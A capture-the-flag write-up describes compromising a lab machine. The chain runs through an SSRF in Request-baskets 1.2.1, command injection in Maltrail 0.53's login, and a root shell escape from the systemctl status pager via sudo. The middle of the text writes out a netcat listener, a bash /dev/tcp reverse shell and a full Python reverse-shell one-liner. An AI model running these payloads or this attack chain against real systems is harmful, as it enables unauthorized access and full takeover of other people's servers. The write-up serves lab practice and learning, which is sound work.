---
difficulty: easy
---
I am given just an IP address. As standard, I start with an `nmap` scan, to start getting a feel for the server. We use `-sV` and `-sC`, which are scripts that wil find the services and their version running on the server, as well as some other useful information.
```bash
nmap -sC -sV -oN nmap/initial.out 10.10.11.224
```
We get the following output (snippet):
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
```
This tells us that there seems to be an HTTP version running on port 80, but its traffic is filtered. Indeed, when we try to access this page by navigating to `http://10.10.11.224:80` in our browser, we cannot get a connection.

Then there's also the unknown service running on 55555. We navigate to `http://10.10.11.224:55555` and find that a service called `Request-baskets 1.2.1` is running there. It seems to be some application which allows a user to generate a link from which HTTP requests are logged.

We look for a possible exploit for this service and find that it is susceptible to [Serverside Request Forgery](https://nvd.nist.gov/vuln/detail/CVE-2023-27163). The application allows users to configure an address that all requests into the buckets are forwarded to. It then also allows the forwarding of that address' response back to the requester. The crucial point is that the forwarded request will be made from the target machine, meaning we can send the request to a webservice on the same machine and bypass any firewall that filters incoming traffic. This firewall will not block requests coming from the same machine ofcourse. So, we can use this bucket as a proxy for communicating with another webservice on the machine. Of course, we remember the filtered 80 port with HTTP on it, which we can probably now access.

So we generate a bucket and change the settings such that requests are forwarded to `http://localhost:80` and responses are forwarded back to us. We then send a basic GET request to the bucket and indeed find that we get the `html` file from port 80. Nice!

The page we see is very barebones, but we can see that this port has a service running called `Maltrail 0.53`. We search for any known exploits and find that the service is susceptible to [Command Injection](https://github.com/spookier/Maltrail-v0.53-Exploit). There is a login page over at `/login` and when checking the supplied `username` data, it uses `subprocess.check_output()` to log the username using a shell command. It however does not sanitize this `username` input, so we can inject arbitrary commands into it. 

We download the [python script](https://github.com/spookier/Maltrail-v0.53-Exploit) which uses this exploit. At this point, because I am actively trying to learn, I try to stay away from running convienent scripts and instead figure out how to do things manually. Thus instead of simply running the script I look at its source code to see what is going on under the hood.

I see that the script sends a POST request with a payload containing the to-be-injected command to the `/login` directory. Of course, this script assumes that we have direct acccess to the Maltrail service at port 80, but we do not, so we would have to send the request to the bucket proxy.

The script used a pretty involved string - even encoded into base64 - as a request to the webservice, most of which I did not understand. Thus I wanted to craft my own POST request. I had quite some trouble getting any code execution this way. Mostly because of 2 reasons:
1. I am not familiar with the syntax of injections like these. So I was unsure how exactly to format this string and the script had no explanation for it.
2. I did not get the standard out as the response to the GET request. It always just responded with "Login Failed". So while I knew from the exploit that code execution was happening/possible, I had no idea what the output of any of my commands were.

These two things combined made it quite difficult to craft a working POST request of my own and I was not able to get code execution going. In the end, I decided to use the script after all. At some point I hope to learn how and why the script had the specific command syntax with the base64 encoding, but that was not today.

First, I got an `nc` listener going on my machine
```bash
nc -lnvp 1337
```
Then I tried the reverse shell command I most often use as the `payload`:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'
```
But that did not seem to execute correctly on the server. However, Maltrain is mostly built using Python, so I knew the server must have python installed. I found a reverse shell command using python:
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Using this as the `payload` we finally get a reverse shell going! Using `id` we find that we are running the shell as a user called `puma`. In their home directory, we find the `user.txt` flag and as such we complete the first part of the box.

Now onto the root flag. This flag is (always) in a file `/root/root.txt` which is owned and only readable by the root user. Thus now we need to find a way to escalate our prvivileges to root.  I use the following command to see what `sudo` privileges this user has:
```bash
sudo -l
```
We find the following output:
```
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
This means that this user can execture the `systemctl status trail.service` command as root, without supplying a password. This is a command that retrieves the status of the `trail.service` service, which turns out to be the service associated with Maltrail. Since this configuration would never occur on a normalm machine, I assume this is indeed the right direction to keep looking. 

We search for some known exploits for `systemctl status`. While not explicitely an exploit perse, we find that the result of this command is opened in a pager, like `less`. The crucial point is that from that pager, we can actually spawn another shell, using `!sh`. However, since the pager run as root, this spawned shell will also run as root.

Being the root user now, we can `cat` out the contents of the `/root/root.txt` flag and we have officially hacked this box!
